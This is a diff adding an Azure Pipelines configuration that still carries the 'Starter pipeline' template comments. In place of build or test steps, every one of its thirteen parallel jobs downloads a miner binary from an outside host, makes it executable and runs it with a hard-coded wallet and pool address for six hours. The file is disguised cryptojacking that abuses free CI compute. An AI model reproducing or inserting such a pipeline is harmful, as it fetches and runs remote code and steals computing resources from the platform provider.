@@ -1,0 +1,89 @@
+190 lines (158 sloc)  8.49 KB
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool: Azure Pipelines
+
+jobs:
+- job: a
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+  
+- job: b
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: c
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: d
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: e
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: f
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: g
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: h
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: i
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: j
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: k
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: l
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
+
+- job: m
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
